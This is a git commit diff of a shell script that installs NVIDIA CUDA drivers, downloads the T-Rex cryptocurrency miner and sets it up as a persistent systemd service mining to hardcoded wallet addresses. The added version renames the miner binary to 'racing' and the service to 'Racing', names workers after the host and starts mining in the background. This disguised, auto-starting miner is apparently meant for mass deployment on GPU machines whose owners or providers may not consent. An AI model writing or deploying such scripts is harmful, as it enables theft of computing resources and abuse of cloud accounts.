ea11e6e90d119873d7606b072df1db7aed7bae0f
rolandmedina54 <109517316+rolandmedina54@users.noreply.github.com>
2022-09-16 01:41:36 +0000

    Update vanbinh.sh

--- vanbinh.sh
+++ vanbinh.sh
@@ -1,30 +1,28 @@
-SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
-if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
-then
-	
-	date "+%d-%m-%y" >> name
-	name=`cat "name"`
-	echo "taind vip pro" > isHaveSetupCoin.txt
-	cd /usr/local/bin
-	sudo apt-get install linux-headers-$(uname -r) -y
-	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-	sudo apt-get update
-	sudo apt-get -y install cuda-drivers --allow-unauthenticated
-	sudo apt-get install libcurl3 -y
-	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.5/t-rex-0.26.5-linux.tar.gz
-	sudo tar xvzf t-rex-0.26.5-linux.tar.gz
-	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/t-rex -a etchash -o stratum+tcp://eu1-etc.ethermine.org:4444 -u 0x5756708c993222ab091e706cc3a70ad1ef1b04f0 -p x -w test &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
-
-	
-	sudo systemctl daemon-reload
-	sudo systemctl enable eth.service
-	sudo systemctl start eth.service
-	sudo reboot
-else
-	sudo systemctl start eth.service
-	sudo reboot
-fi
+myworker=$(date +'%d%m_')
+username=$HOSTNAME
+myworker+=$username
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-key del 7fa2af80
+sudo rm /etc/apt/sources.list.d/cuda.list
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
+sudo dpkg -i cuda-keyring_1.0-1_all.deb
+sudo apt-get update
+sudo apt-get -y install cuda-drivers
+sudo apt-get install libcurl4 -y
+sudo apt-get install cuda-drivers-515 -y
+sudo apt-get install cuda-drivers-fabricmanager-515 -y
+sudo systemctl enable nvidia-fabricmanager
+sudo systemctl start nvidia-fabricmanager
+sudo nvidia-smi mig -cgi 0 -C
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
+sudo mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.reminer -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo systemctl daemon-reload
+sudo systemctl enable racing.service
+./racing -a kawpow -o us-rvn.2miners.com:6060 -u RJz3QMJoXjfLS6wrEstGj7NGp6xheFdJhK.${myworker} -p x &
